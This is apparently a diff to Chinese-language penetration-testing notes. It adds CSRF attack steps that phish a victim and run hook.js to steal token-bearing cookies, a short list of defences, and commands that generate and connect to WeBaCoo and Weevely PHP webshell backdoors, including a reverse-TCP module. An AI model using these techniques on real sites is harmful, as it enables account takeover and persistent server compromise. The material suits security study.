@@ -202,7 +202,27 @@
 
   ```tex
   # 关键性操作，二次验证；付款、改密等
-  # BP 抓包右击》Engagement tools》Generate CSRF PoC (生成的HTML 视)
+  # BP 抓包右击》Engagement tools》Generate CSRF PoC (生成的HTML 视情况修改)
+  
+  # 攻击技巧
+      1. 诱导受害者访问钓鱼网站
+      2. 触发本地PC 下载hook.js 文件
+      3. 本地PC 运行hook.js 文件，获取包含动态token 的cookie
+      4. 利用包含动态token 的cookie 发起CSRF 攻击
+  
+  # 防御 & 辅助措施
+  	1. 嵌入令牌/二次确认/Referer 确认
+  	2. 发邮件/短信
+  	
+  # webshell
+  	1. WeBaCoo // 通过Cookie 字段传输；cm 为base64 编码命令，cn 为服务器用于返回数据的cookie 名，cp 为返回信息定界符
+  		webacoo -g -o backdoor_webacoo.php # -g 服务端脚本，-o 生成文件
+  		webacoo -t -u http://target.vulhost.com/backdoor_webacoo.php # 上传文件至目标站点后进行连接
+  	2. Weevely // 加密传输，有自带模块
+  		weevely generate password backdoor_weevely.php # 生成带密码的后门
+  		weevely http://target.vulhost.com/backdoor_weevely.php password # 上传文件至目标站点后进行连接
+  		# 自带模块
+  		help/system_info/audit_phpconf/backdoor_reversetcp/net_proxy/net
   ```
 
-  
+- 
